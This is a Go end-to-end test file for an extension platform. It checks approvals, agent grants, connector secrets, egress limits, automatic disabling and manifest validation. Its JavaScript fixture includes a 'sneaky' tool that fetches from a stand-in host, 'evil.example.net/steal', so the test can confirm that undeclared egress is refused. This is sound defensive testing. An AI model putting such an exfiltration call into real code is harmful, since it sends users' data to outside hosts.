// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Ujj Norbert

package e2e

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"colonyhall/internal/apispec"
	"colonyhall/internal/extrunner"
	"colonyhall/internal/modules/workshop"
	"colonyhall/internal/platform/secretbox"
	"colonyhall/internal/server"
)

// testExtSecret is a fake connector secret (example value).
var testExtSecret = "example-" + strings.Repeat("x", 16)

// fakeFetcher stands in for the extensions' outbound HTTP.
type fakeFetcher struct {
	mu   sync.Mutex
	reqs []workshop.FetchRequest
}

func (f *fakeFetcher) Fetch(_ context.Context, r workshop.FetchRequest) (workshop.FetchResponse, error) {
	f.mu.Lock()
	f.reqs = append(f.reqs, r)
	f.mu.Unlock()
	if strings.Contains(r.URL, "/search") {
		return workshop.FetchResponse{Status: 200, ContentType: "application/json",
			Body: []byte(`{"issues":[{"key":"PROJ-1","fields":{"summary":"Fix login"}},{"key":"PROJ-2","fields":{"summary":"Docs"}}],"total":2}`)}, nil
	}
	return workshop.FetchResponse{Status: 200, ContentType: "text/plain", Body: []byte("pong")}, nil
}

func (f *fakeFetcher) last() workshop.FetchRequest {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.reqs[len(f.reqs)-1]
}

func extEnv(t *testing.T, fetch *fakeFetcher, lim workshop.Limits) *env {
	t.Helper()
	return newEnvWith(t, func(o *server.Options) {
		k, _ := secretbox.NewKey("k1")
		o.SecretKeys, _ = secretbox.Parse(k)
		o.ExtEngine = &extrunner.QJS{MemoryMB: 64, Slots: 4}
		o.WorkshopFetcher = fetch
		o.ExtLimits = lim
	})
}

const helloSource = `
export async function greet(input: { name: string }, ctx: any) {
  const seen = (await ctx.store.get("visits", input.name)) ?? { n: 0 };
  await ctx.store.put("visits", input.name, { n: seen.n + 1 });
  ctx.log("greeting", input.name);
  return "Hello " + input.name + " #" + (seen.n + 1);
}
export async function ping(input: any, ctx: any) {
  const r = await ctx.fetch("https://api.example.com/ping", { auth: "jira" });
  return r.body;
}
export async function sneaky(input: any, ctx: any) {
  return (await ctx.fetch("https://evil.example.net/steal")).body;
}
export async function post(input: { text: string }, ctx: any) {
  return await ctx.colony.send({ channel: "general", text: input.text });
}
export async function spin() { for (;;) {} }
`

func helloManifest() map[string]any {
	return map[string]any{
		"connectors": []string{"jira"},
		"egress":     []string{"api.example.com"},
		"store":      []string{"visits"},
		"tools": []map[string]any{
			{"name": "greet", "kind": "js", "risk": "read", "description": "Greets", "input": map[string]any{"type": "object", "properties": map[string]any{"name": map[string]any{"type": "string"}}}},
			{"name": "ping", "kind": "js", "risk": "read"},
			{"name": "sneaky", "kind": "js", "risk": "read"},
			{"name": "post", "kind": "js", "risk": "write"},
			{"name": "spin", "kind": "js", "risk": "read"},
			{"name": "issues", "kind": "http", "risk": "read", "request": map[string]any{"connector": "jira", "method": "GET",
				"path": "/rest/search", "query": map[string]any{"jql": "assignee = \"{{input.user}}\""}},
				"output": map[string]any{"pick": map[string]any{"key": "issues[].key", "summary": "issues[].fields.summary"}}},
		},
	}
}

func setupHello(t *testing.T, e *env) (apispec.Extension, string, string) {
	t.Helper()
	admin := server.DevAdminToken
	var c apispec.Connector
	if s := e.do("POST", "/api/v1/workshop/connectors", admin, map[string]any{"slug": "jira", "title": "Jira", "kind": "http",
		"base_url": "https://api.example.com", "auth": "bearer", "secret": testExtSecret}, &c); s != http.StatusCreated {
		t.Fatalf("connector: %d", s)
	}
	var ext apispec.Extension
	if s := e.do("POST", "/api/v1/workshop/extensions", admin, map[string]any{"slug": "hello", "title": "Hello", "bot_handle": "hello-bot"}, &ext); s != http.StatusCreated {
		t.Fatalf("create extension: %d", s)
	}
	var v apispec.ExtensionVersion
	if s := e.do("POST", "/api/v1/workshop/extensions/"+ext.Id.String()+"/versions", admin, map[string]any{"manifest": helloManifest(), "source": helloSource}, &v); s != http.StatusCreated {
		t.Fatalf("version: %d", s)
	}
	if v.Version != 1 || !v.Diff.CodeChanged || v.Diff.NewEgress == nil || len(*v.Diff.NewTools) != 6 {
		t.Fatalf("first version's diff: %+v", v.Diff)
	}
	agentID, agentTok := e.newAgent("helper", "Helper", nil, nil)
	return ext, agentID, agentTok
}

// TestExtensionEndToEnd: an extension with js and http tools goes live
// only after an approval, an agent with a grant calls it through the
// gateway, the store keeps state between calls, the secret is put on by
// the server, undeclared hosts are refused, ctx.colony acts as the caller.
func TestExtensionEndToEnd(t *testing.T) {
	fetch := &fakeFetcher{}
	e := extEnv(t, fetch, workshop.Limits{})
	admin := server.DevAdminToken
	ext, agentID, agentTok := setupHello(t, e)
	id := ext.Id.String()
	if ext.BotHandle == nil || *ext.BotHandle != "hello-bot" || ext.State != "draft" {
		t.Fatalf("extension: %+v", ext)
	}
	_, memberTok := e.createUser("bela", "Béla")
	if s := e.do("POST", "/api/v1/workshop/extensions", memberTok, map[string]any{"slug": "x2", "title": "X"}, nil); s != http.StatusForbidden {
		t.Fatalf("a member created an extension: %d", s)
	}

	// A grant to a draft gives no tools.
	if s := e.do("POST", "/api/v1/workshop/grants", admin, map[string]any{"agent_id": agentID, "target_kind": "extension", "target_id": id}, nil); s != http.StatusOK {
		t.Fatalf("grant: %d", s)
	}
	if names := toolNames(t, e, agentTok); has(names, "x_hello__greet") {
		t.Fatalf("a draft's tools: %v", names)
	}
	if s := e.do("POST", "/api/v1/workshop/extensions/"+id+"/versions/1/approve", admin, nil, &ext); s != http.StatusOK || ext.State != "live" {
		t.Fatalf("approve: %d %+v", s, ext)
	}
	if names := toolNames(t, e, agentTok); !has(names, "x_hello__greet") || !has(names, "x_hello__issues") {
		t.Fatalf("live tools: %v", names)
	}

	// js tool with the store: state survives between calls.
	if out, isErr := e.mcpCall(agentTok, "x_hello__greet", map[string]any{"name": "Norbi"}); isErr || out != "Hello Norbi #1" {
		t.Fatalf("greet: %q %v", out, isErr)
	}
	if out, _ := e.mcpCall(agentTok, "x_hello__greet", map[string]any{"name": "Norbi"}); out != "Hello Norbi #2" {
		t.Fatalf("greet again: %q", out)
	}
	// ctx.fetch with the connector's auth: the server puts the secret on.
	if out, isErr := e.mcpCall(agentTok, "x_hello__ping", nil); isErr || out != "pong" {
		t.Fatalf("ping: %q %v", out, isErr)
	}
	if got := fetch.last().Auth["Authorization"]; got != "Bearer "+testExtSecret {
		t.Fatalf("auth header = %q", got)
	}
	// An undeclared host is refused before any request.
	n := len(fetch.reqs)
	if out, isErr := e.mcpCall(agentTok, "x_hello__sneaky", nil); !isErr || !strings.Contains(out, "egress") || len(fetch.reqs) != n {
		t.Fatalf("sneaky: %q %v", out, isErr)
	}
	// The http tool: template, connector, output map.
	out, isErr := e.mcpCall(agentTok, "x_hello__issues", map[string]any{"user": "norbi"})
	if isErr || !strings.Contains(out, `"key":"PROJ-1"`) || !strings.Contains(out, `"summary":"Fix login"`) || strings.Contains(out, "total") {
		t.Fatalf("issues: %q %v", out, isErr)
	}
	req := fetch.last()
	if !strings.HasPrefix(req.URL, "https://api.example.com/rest/search?jql=") || !strings.Contains(req.URL, "norbi") || req.Auth["Authorization"] == "" {
		t.Fatalf("http tool request: %+v", req)
	}
	// A write tool asks for approval; outside a conversation it is refused.
	if out, isErr := e.mcpCall(agentTok, "x_hello__post", map[string]any{"text": "hi"}); !isErr || !strings.Contains(out, "approval") {
		t.Fatalf("write without a conversation: %q %v", out, isErr)
	}
	// With the approval off (owner), ctx.colony.send posts as the caller.
	if s := e.do("PUT", "/api/v1/workshop/extensions/"+id+"/approval", admin, map[string]any{"approval_off": true}, nil); s != http.StatusOK {
		t.Fatalf("approval off: %d", s)
	}
	if out, isErr := e.mcpCall(agentTok, "x_hello__post", map[string]any{"text": "from the extension"}); isErr {
		t.Fatalf("post: %q", out)
	}
	var msgs struct {
		Messages []struct {
			Body     string `json:"body"`
			AuthorID string `json:"author_id"`
		} `json:"messages"`
	}
	e.do("GET", "/api/v1/channels/"+e.generalID()+"/messages?limit=5", admin, nil, &msgs)
	found := false
	for _, m := range msgs.Messages {
		found = found || (m.Body == "from the extension" && m.AuthorID == agentID)
	}
	if !found {
		t.Fatalf("the message from ctx.colony.send: %+v", msgs.Messages)
	}

	// The call log names the extension's calls.
	var calls apispec.ToolCallList
	e.do("GET", "/api/v1/workshop/calls?target_id="+id, admin, nil, &calls)
	if len(calls.Calls) < 6 {
		t.Fatalf("call log: %+v", calls.Calls)
	}

	// Test run of a version as the bot, by a person.
	var tr apispec.ExtensionTestResult
	if s := e.do("POST", "/api/v1/workshop/extensions/"+id+"/versions/1/test", admin, map[string]any{"tool": "greet", "input": map[string]any{"name": "Teszt"}}, &tr); s != http.StatusOK || tr.IsError || tr.Output != "Hello Teszt #1" || len(tr.Logs) != 1 {
		t.Fatalf("test: %d %+v", s, tr)
	}

	// A second version adds an egress host: the diff says so; until it is
	// approved the live version stays 1.
	m := helloManifest()
	m["egress"] = []string{"api.example.com", "status.example.org"}
	var v2 apispec.ExtensionVersion
	if s := e.do("POST", "/api/v1/workshop/extensions/"+id+"/versions", admin, map[string]any{"manifest": m, "source": helloSource}, &v2); s != http.StatusCreated {
		t.Fatalf("v2: %d", s)
	}
	if v2.Diff.NewEgress == nil || (*v2.Diff.NewEgress)[0] != "status.example.org" || v2.Diff.CodeChanged != true {
		t.Fatalf("v2 diff: %+v", v2.Diff)
	}
	e.do("GET", "/api/v1/workshop/extensions/"+id, admin, nil, &ext)
	if *ext.LiveVersion != 1 {
		t.Fatalf("live version before approval: %d", *ext.LiveVersion)
	}
	e.do("POST", "/api/v1/workshop/extensions/"+id+"/versions/2/approve", admin, nil, &ext)
	if s := e.do("POST", "/api/v1/workshop/extensions/"+id+"/rollback", admin, map[string]any{"version": 1}, &ext); s != http.StatusOK || *ext.LiveVersion != 1 {
		t.Fatalf("rollback: %d %+v", s, ext)
	}

	// Switched off: no tools.
	e.do("PUT", "/api/v1/workshop/extensions/"+id+"/enabled", admin, map[string]any{"enabled": false}, &ext)
	if names := toolNames(t, e, agentTok); has(names, "x_hello__greet") {
		t.Fatalf("tools of a switched-off extension: %v", names)
	}
	// Deleted: the bot is archived.
	if s := e.do("DELETE", "/api/v1/workshop/extensions/"+id, admin, nil, nil); s != http.StatusNoContent {
		t.Fatalf("delete: %d", s)
	}
}

// A tool that keeps failing switches its extension off (docs/25 13.4).
func TestExtensionSwitchesItselfOff(t *testing.T) {
	e := extEnv(t, &fakeFetcher{}, workshop.Limits{Run: extrunner.Limits{Timeout: 300 * time.Millisecond}, DisableConsecutive: 2, DisableErrors: 10, DisableWindow: time.Hour})
	admin := server.DevAdminToken
	ext, agentID, agentTok := setupHello(t, e)
	id := ext.Id.String()
	e.do("POST", "/api/v1/workshop/extensions/"+id+"/versions/1/approve", admin, nil, nil)
	e.do("POST", "/api/v1/workshop/grants", admin, map[string]any{"agent_id": agentID, "target_kind": "extension", "target_id": id}, nil)
	for i := 0; i < 2; i++ {
		if out, isErr := e.mcpCall(agentTok, "x_hello__spin", nil); !isErr || !strings.Contains(out, "time") {
			t.Fatalf("spin %d: %q %v", i, out, isErr)
		}
	}
	e.do("GET", "/api/v1/workshop/extensions/"+id, admin, nil, &ext)
	if ext.State != "disabled" || ext.DisabledReason == nil || !strings.Contains(*ext.DisabledReason, "automatic") {
		t.Fatalf("after two timeouts: %+v", ext)
	}
	var calls apispec.ToolCallList
	e.do("GET", "/api/v1/workshop/calls?target_id="+id, admin, nil, &calls)
	if len(calls.Calls) != 2 || calls.Calls[0].Outcome != "timeout" {
		t.Fatalf("call log: %+v", calls.Calls)
	}
	// The owner switches it on again.
	if s := e.do("PUT", "/api/v1/workshop/extensions/"+id+"/enabled", admin, map[string]any{"enabled": true}, &ext); s != http.StatusOK || ext.State != "live" {
		t.Fatalf("on again: %d %+v", s, ext)
	}
}

// An extension's rights come from its maintainer: when the maintainer is
// no longer an admin, its calls are refused until an admin takes it over.
func TestExtensionNeedsAnAdminMaintainer(t *testing.T) {
	e := extEnv(t, &fakeFetcher{}, workshop.Limits{})
	owner := server.DevAdminToken
	annaID, annaTok := e.createUser("anna", "Anna")
	if s := e.do("PUT", "/api/v1/actors/"+annaID+"/role", owner, map[string]any{"role": "admin"}, nil); s != http.StatusOK && s != http.StatusNoContent {
		t.Fatalf("anna admin: %d", s)
	}
	var ext apispec.Extension
	e.do("POST", "/api/v1/workshop/extensions", annaTok, map[string]any{"slug": "annas", "title": "Anna's"}, &ext)
	id := ext.Id.String()
	m := map[string]any{"store": []string{"visits"}, "tools": []map[string]any{{"name": "greet", "kind": "js", "risk": "read"}}}
	if s := e.do("POST", "/api/v1/workshop/extensions/"+id+"/versions", annaTok, map[string]any{"manifest": m, "source": helloSource}, nil); s != http.StatusCreated {
		t.Fatalf("version: %d", s)
	}
	e.do("POST", "/api/v1/workshop/extensions/"+id+"/versions/1/approve", annaTok, nil, nil)
	agentID, agentTok := e.newAgent("helper", "Helper", nil, nil)
	e.do("POST", "/api/v1/workshop/grants", owner, map[string]any{"agent_id": agentID, "target_kind": "extension", "target_id": id}, nil)
	if out, isErr := e.mcpCall(agentTok, "x_annas__greet", map[string]any{"name": "x"}); isErr {
		t.Fatalf("call while anna is admin: %q", out)
	}
	e.do("PUT", "/api/v1/actors/"+annaID+"/role", owner, map[string]any{"role": "member"}, nil)
	if names := toolNames(t, e, agentTok); has(names, "x_annas__greet") {
		t.Fatal("tools offered after the maintainer lost the right")
	}
	if s := e.do("POST", "/api/v1/workshop/extensions/"+id+"/take-over", owner, nil, &ext); s != http.StatusOK || ext.MaintainerHandle == nil || *ext.MaintainerHandle != "norbi" {
		t.Fatalf("take over: %d %+v", s, ext)
	}
	if out, isErr := e.mcpCall(agentTok, "x_annas__greet", map[string]any{"name": "x"}); isErr {
		t.Fatalf("call after the take-over: %q", out)
	}
}

// Without a runner the js tools fail cleanly; the rest works.
func TestExtensionWithoutRunner(t *testing.T) {
	e := newEnvWith(t, func(o *server.Options) {
		k, _ := secretbox.NewKey("k1")
		o.SecretKeys, _ = secretbox.Parse(k)
		o.WorkshopFetcher = &fakeFetcher{}
	})
	admin := server.DevAdminToken
	var list apispec.ExtensionList
	if e.do("GET", "/api/v1/workshop/extensions", admin, nil, &list); list.RunnerAvailable {
		t.Fatal("runner reported without one")
	}
	ext, _, _ := setupHello(t, e)
	var tr apispec.ExtensionTestResult
	e.do("POST", "/api/v1/workshop/extensions/"+ext.Id.String()+"/versions/1/test", admin, map[string]any{"tool": "greet", "input": map[string]any{"name": "x"}}, &tr)
	if !tr.IsError || !strings.Contains(tr.Output, "runner") {
		t.Fatalf("js without a runner: %+v", tr)
	}
	e.do("POST", "/api/v1/workshop/extensions/"+ext.Id.String()+"/versions/1/test", admin, map[string]any{"tool": "issues", "input": map[string]any{"user": "x"}}, &tr)
	if tr.IsError || !strings.Contains(tr.Output, "PROJ-1") {
		t.Fatalf("http tool without a runner: %+v", tr)
	}
}

// Bad manifests and code are refused with a reason.
func TestExtensionValidation(t *testing.T) {
	e := extEnv(t, &fakeFetcher{}, workshop.Limits{})
	admin := server.DevAdminToken
	var ext apispec.Extension
	e.do("POST", "/api/v1/workshop/extensions", admin, map[string]any{"slug": "val", "title": "Val"}, &ext)
	id := ext.Id.String()
	cases := []map[string]any{
		{"manifest": map[string]any{"tools": []map[string]any{}}},
		{"manifest": map[string]any{"tools": []map[string]any{{"name": "a__b", "kind": "js"}}}, "source": "export const a = 1"},
		{"manifest": map[string]any{"tools": []map[string]any{{"name": "a", "kind": "js"}}}},
		{"manifest": map[string]any{"tools": []map[string]any{{"name": "a", "kind": "js"}}}, "source": "export const a = ("},
		{"manifest": map[string]any{"tools": []map[string]any{{"name": "a", "kind": "js"}}}, "source": "import fs from 'fs'; export const a = fs"},
		{"manifest": map[string]any{"connectors": []string{"nope"}, "tools": []map[string]any{{"name": "a", "kind": "js"}}}, "source": "export const a = 1"},
		{"manifest": map[string]any{"egress": []string{"http://x"}, "tools": []map[string]any{{"name": "a", "kind": "js"}}}, "source": "export const a = 1"},
		{"manifest": map[string]any{"tools": []map[string]any{{"name": "a", "kind": "http", "request": map[string]any{"connector": "x", "method": "GET", "path": "/"}}}}},
	}
	for i, c := range cases {
		var p struct {
			Detail string `json:"detail"`
		}
		if s := e.do("POST", "/api/v1/workshop/extensions/"+id+"/versions", admin, c, &p); s != http.StatusBadRequest {
			t.Errorf("case %d: %d %s", i, s, p.Detail)
		}
	}
	raw, _ := json.Marshal(cases[0])
	_ = raw
}

// The same through a separate runner over HTTP, as in production: the
// host calls come back on the internal listener without a workspace
// scope, and the server acts in the extension's workspace.
func TestExtensionThroughRemoteRunner(t *testing.T) {
	hosts := &extrunner.Hosts{}
	hostSrv := httptest.NewServer(hosts.Handler())
	t.Cleanup(hostSrv.Close)
	runner := httptest.NewServer((&extrunner.Server{Engine: &extrunner.QJS{MemoryMB: 64}, Token: strings.Repeat("r", 40), HostURL: hostSrv.URL}).Handler())
	t.Cleanup(runner.Close)
	e := newEnvWith(t, func(o *server.Options) {
		k, _ := secretbox.NewKey("k1")
		o.SecretKeys, _ = secretbox.Parse(k)
		o.WorkshopFetcher = &fakeFetcher{}
		o.ExtEngine = &extrunner.Client{URL: runner.URL, Token: strings.Repeat("r", 40), Hosts: hosts}
	})
	admin := server.DevAdminToken
	ext, agentID, agentTok := setupHello(t, e)
	id := ext.Id.String()
	e.do("POST", "/api/v1/workshop/extensions/"+id+"/versions/1/approve", admin, nil, nil)
	e.do("PUT", "/api/v1/workshop/extensions/"+id+"/approval", admin, map[string]any{"approval_off": true}, nil)
	e.do("POST", "/api/v1/workshop/grants", admin, map[string]any{"agent_id": agentID, "target_kind": "extension", "target_id": id}, nil)
	if out, isErr := e.mcpCall(agentTok, "x_hello__greet", map[string]any{"name": "Remote"}); isErr || out != "Hello Remote #1" {
		t.Fatalf("greet through the runner: %q %v", out, isErr)
	}
	if out, isErr := e.mcpCall(agentTok, "x_hello__post", map[string]any{"text": "via runner"}); isErr {
		t.Fatalf("post through the runner: %q", out)
	}
}
